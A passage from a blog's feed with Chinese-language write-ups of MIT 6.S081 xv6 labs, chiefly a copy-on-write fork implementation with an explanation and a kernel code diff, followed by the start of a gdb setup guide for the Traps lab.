pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Uthread-switching-between-threads&quot;&gt;&lt;a href=&quot;#Uthread-switching-between-threads&quot; class=&quot;headerlink&quot; title=&quot;Uthread: switching between</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Copy on-write</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/</id>
    <published>2024-08-13T03:45:11.000Z</published>
    <updated>2024-08-13T10:01:33.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Implement-copy-on-write"><a href="#Implement-copy-on-write" class="headerlink" title="Implement copy-on write"></a>Implement copy-on write</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>xv6 使用 <code>fork()</code> 系统调用创建子进程时，需要将父进程的地址空间进行 <strong>深拷贝</strong> ，即将页表和实际物理空间同时进行拷贝，以实现父进程和子进程地址空间的独立性。但很多时候，如 shell 程序，<code>fork()</code> 通常与 <code>exec()</code> 搭配使用，首先使用 <code>fork()</code> 创建子进程，随后在子进程中使用 <code>exec()</code> 将指定的程序加载到当前地址空间，这样在 <code>fork()</code> 中进行的地址空间拷贝就白白浪费了。</p><p>本实现要求实现一个写时复制（copy-on write）的 <code>fork()</code> 系统调用。具体来说，在进行虚拟内存拷贝时，不直接进行物理内存的拷贝，只是将父进程的页表复制给子进程，这样子进程和父进程的每个虚拟页面都指向了同一个物理页面，当子进程需要对某个虚拟页面进行写入时，为了保证父进程和子进程之间的独立性，子进程此时将进行物理内存的分配和拷贝，再进行写入。</p><h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><p>根据提示，可以将上述的写时复制的思路用 <strong>异常</strong> 的方式来实现。</p><p>首先可以利用页表项的 flags 中的 RSW 位来表示页表项是否为 COW 页，以便后续的异常处理。</p><p>修改 <code>uvmcopy()</code> ，将物理页面的分配操作去除，只是进行页表的拷贝，并将父进程和子进程的对应页表项的 PTE_W 置 0（以便在对 COW 页进行写入时陷入内核）、PTE_COW 置 1。</p><p>修改 <code>usertrap()</code>，当陷入内核时，内核通过查看 scause 寄存器（见下图）以及页表项的 PTE_W 和 PTE_COW 位，识别到陷入原因是发生在 COW 页上的 store page fault（寄存器值为 15）时，进行对应的异常处理：使用 <code>kalloc()</code> 为其分配物理页面，并将其页表项指向的物理地址数据拷贝到新分配的物理地址下，实现物理内存的拷贝。此时由于页表映射发生了改变，需要插入新的页表项，并删除旧的页表项。在处理了 COW 异常之后，该页面将不再是一个 COW 页，因此需要将 PTE_W 置 1、PTE_COW 置 0。</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/pf.png"></p><p>为了后续实现的方便，可以将 COW 页的判断和 COW 页的异常处理分别封装为两个函数：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">iscowpage</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pgtbl<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>va <span class="token operator">>=</span> MAXVA<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span> <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pgtbl<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_V<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_COW<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cowfault</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    uint64 va0 <span class="token operator">=</span> <span class="token function">PGROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span><span class="token operator">*</span> pte<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    uint64 flags <span class="token operator">=</span> <span class="token function">PTE_FLAGS</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 pa0 <span class="token operator">=</span> <span class="token function">PTE2PA</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    flags <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">~</span>PTE_COW<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clear COW bit</span>    flags <span class="token operator">|=</span> PTE_W<span class="token punctuation">;</span>      <span class="token comment">// set write bit</span>    uint64 mem<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pa0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// remove old PTE</span>    <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// install new PTE</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此外，还需要为每个物理页面引入 <strong>引用计数（reference count）</strong> ，页面创建时计数为 1，每次添加或移除指向该物理地址的页表项都增加或减少引用计数，当引用计数为 0 时释放该物理页面。这里有一个实现的技巧：将引用计数的减少放到 <code>kfree()</code> 中，在 <code>kfree()</code> 中根据引用计数的大小决定是否释放物理页面。</p><p>最后，也是很容易忽视的一点，修改 <code>copyout()</code> 以实现对 COW 页的支持。刚开始看到这个提示的时候我很疑惑，前面的工作貌似已经足够实现 COW 了，为什么还要修改 <code>copyout</code>？原来 xv6 对 COW 页进行写时复制都是基于 store page fault，即当尝试写入一个 PTE_W 为 0 的页面时触发异常，导致陷入内核，再由内核进行 COW 页面的异常处理，其中陷入内核的操作是由硬件自动来完成的，具体来说，是在虚实地址转换阶段由 MMU 来完成的。而 <code>copyout()</code> 是运行在内核态下的函数，其地址转换是由内核中的函数 <code>walk()</code> 来实现的，因而不会自动触发异常并交由异常处理程序来处理，而需要手动来完成。由于前面已经将 COW 页的判断和处理封装成了函数，因此对 <code>copyout()</code> 的修改很简单：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iscowpage</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">cowfault</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..f5a9d8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            incrfcount(void*);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -145,6 +146,8 @@ void            trapinit(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            trapinithart(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern struct spinlock tickslock;</span><span class="token prefix unchanged"> </span><span class="token line">void            usertrapret(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int             iscowpage(pagetable_t, uint64);</span><span class="token prefix inserted">+</span><span class="token line">int             cowfault(pagetable_t, uint64);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// uart.c</span><span class="token prefix unchanged"> </span><span class="token line">void            uartinit(void);</span></span>@@ -170,6 +173,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t*          walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..5872b85 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -14,6 +14,11 @@ void freerange(void *pa_start, void *pa_end);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern char end[]; // first address after kernel.</span><span class="token prefix unchanged"> </span><span class="token line">                   // defined by kernel.ld.</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PA2RFIDX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int rfcount[(PHYSTOP - KERNBASE) / PGSIZE];</span><span class="token prefix inserted">+</span><span class="token line">struct spinlock rflock;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct run &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct run *next;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -27,6 +32,7 @@ void<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">kinit()</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  initlock(&amp;kmem.lock, "kmem");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  initlock(&amp;rflock, "rflock");</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  freerange(end, (void*)PHYSTOP);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -51,15 +57,17 @@ kfree(void *pa)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa >= PHYSTOP)</span><span class="token prefix unchanged"> </span><span class="token line">    panic("kfree");</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  // Fill with junk to catch dangling refs.</span><span class="token prefix deleted">-</span><span class="token line">  memset(pa, 1, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  r = (struct run*)pa;</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  acquire(&amp;kmem.lock);</span><span class="token prefix deleted">-</span><span class="token line">  r->next = kmem.freelist;</span><span class="token prefix deleted">-</span><span class="token line">  kmem.freelist = r;</span><span class="token prefix deleted">-</span><span class="token line">  release(&amp;kmem.lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  if(--rfcount[PA2RFIDX(pa)] &lt;= 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    memset(pa, 1, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">    // Fill with junk to catch dangling refs.</span><span class="token prefix inserted">+</span><span class="token line">    r = (struct run*)pa;</span><span class="token prefix inserted">+</span><span class="token line">    acquire(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">    r->next = kmem.freelist;</span><span class="token prefix inserted">+</span><span class="token line">    kmem.freelist = r;</span><span class="token prefix inserted">+</span><span class="token line">    release(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Allocate one 4096-byte page of physical memory.</span></span>@@ -76,7 +84,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    kmem.freelist = r->next;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;kmem.lock);</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(r)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(r) &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    rfcount[PA2RFIDX(r)] = 1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void incrfcount(void* pa)&#123;</span><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  ++rfcount[PA2RFIDX(pa)];</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..a6ba9e7 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,8 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_COW (1L &lt;&lt; 8) // 1 -> is a COW page</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..0fb7687 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span>@@ -29,6 +29,42 @@ trapinithart(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  w_stvec((uint64)kernelvec);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int iscowpage(pagetable_t pgtbl, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  if (va >= MAXVA) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte = walk(pgtbl, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">  if (pte == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_V) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_U) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  return *pte &amp; PTE_COW;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int cowfault(pagetable_t pagetable, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 va0 = PGROUNDDOWN(va);</span><span class="token prefix inserted">+</span><span class="token line">  pte_t* pte;</span><span class="token prefix inserted">+</span><span class="token line">  if((pte = walk(pagetable, va0, 0)) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  uint64 flags = PTE_FLAGS(*pte);</span><span class="token prefix inserted">+</span><span class="token line">  uint64 pa0 = PTE2PA(*pte);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  flags &amp;= (~PTE_COW); // clear COW bit</span><span class="token prefix inserted">+</span><span class="token line">  flags |= PTE_W;      // set write bit</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  uint64 mem;</span><span class="token prefix inserted">+</span><span class="token line">  if ((mem = (uint64)kalloc()) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  memmove((void *)mem, (void *)pa0, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  // remove old PTE</span><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, va0, 1, 1);</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // install new PTE</span><span class="token prefix inserted">+</span><span class="token line">  if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    kfree((void *)mem);</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//</span><span class="token prefix unchanged"> </span><span class="token line">// handle an interrupt, exception, or system call from user space.</span><span class="token prefix unchanged"> </span><span class="token line">// called from trampoline.S</span></span>@@ -67,7 +103,12 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    syscall();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125; else if((which_dev = devintr()) != 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // ok</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  &#125; else &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125; else if (r_scause() == 15 &amp;&amp; iscowpage(p->pagetable, r_stval())) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if (cowfault(p->pagetable, r_stval()) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      p->killed = 1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("usertrap(): unexpected scause %p pid=%d\n", r_scause(), p->pid);</span><span class="token prefix unchanged"> </span><span class="token line">    printf("            sepc=%p stval=%p\n", r_sepc(), r_stval());</span><span class="token prefix unchanged"> </span><span class="token line">    p->killed = 1;</span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..df0ddde 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -303,22 +303,20 @@ uvmcopy(pagetable_t old, pagetable_t new, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  pte_t *pte;</span><span class="token prefix unchanged"> </span><span class="token line">  uint64 pa, i;</span><span class="token prefix unchanged"> </span><span class="token line">  uint flags;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  char *mem;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  for(i = 0; i &lt; sz; i += PGSIZE)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    if((pte = walk(old, i, 0)) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: pte should exist");</span><span class="token prefix unchanged"> </span><span class="token line">    if((*pte &amp; PTE_V) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: page not present");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    *pte &amp;= ~PTE_W;   // set write bit</span><span class="token prefix inserted">+</span><span class="token line">    *pte |= PTE_COW;  // clear COW bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa = PTE2PA(*pte);</span><span class="token prefix unchanged"> </span><span class="token line">    flags = PTE_FLAGS(*pte);</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if((mem = kalloc()) == 0)</span><span class="token prefix deleted">-</span><span class="token line">      goto err;</span><span class="token prefix deleted">-</span><span class="token line">    memmove(mem, (char*)pa, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line">    if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;</span><span class="token prefix deleted">-</span><span class="token line">      kfree(mem);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if(mappages(new, i, PGSIZE, pa, flags) != 0)&#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">      goto err;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    incrfcount((void*)pa); // increment reference count to pa</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -350,6 +348,9 @@ copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  while(len > 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    va0 = PGROUNDDOWN(dstva);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if (iscowpage(pagetable, va0)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      cowfault(pagetable, va0);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa0 = walkaddr(pagetable, va0);</span><span class="token prefix unchanged"> </span><span class="token line">    if(pa0 == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      return -1;</span></span>diff --git a/time.txt b/time.txtnew file mode 100644index 0000000..209e3ef<span class="token coord">--- /dev/null</span><span class="token coord">+++ b/time.txt</span><span class="token coord">@@ -0,0 +1 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">20</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Implement-copy-on-write&quot;&gt;&lt;a href=&quot;#Implement-copy-on-write&quot; class=&quot;headerlink&quot; title=&quot;Implement copy-on write&quot;&gt;&lt;/a&gt;Implement copy-on</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Traps</title>
    <link href="http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/"/>
    <id>http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/</id>
    <published>2024-07-06T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:10.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用gdb调试xv6内核"><a href="#使用gdb调试xv6内核" class="headerlink" title="使用gdb调试xv6内核"></a>使用gdb调试xv6内核</h1><p>从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进行调试可能是帮助理解操作系统机制的绝佳方法。因此在开始本 Lab 之前，我们先来配置一下针对 xv6 内核的 gdb 调试器。</p><ol><li>安装 <code>gdb-multiarch</code>.</li></ol><p>利用包管理工具进行安装，我使用的是 Ubuntu 系统，执行以下命令：</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo apt install gdb-multiarch</code></pre><ol start="2"><li>在 xv6 项目根目录下可以看到 <code>.gdbinit</code> 文件，其中已经写好了一些 <code>gdb</code> 的初始化选项，使用文本编辑器或 <code>cat</code> 命令查看：</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">set confirm off                                                         set architecture riscv:rv64                                             target remote 127.0.0.1:26000                                           symbol-file kernel/kernel                                               set disassemble-next-line auto           set riscv use-compressed-breakpoints yes</code></pre><ol start="3"><li>在 <code>~/.config/gdb/</code> 目录下的文件 <code>gdbinit</code> 中（没有则新建）添加安全加载路径，否则可能无法加载 <code>.gdbinit</code> 的配置。</li></ol><pre class="language-ini" data-language="ini"><code 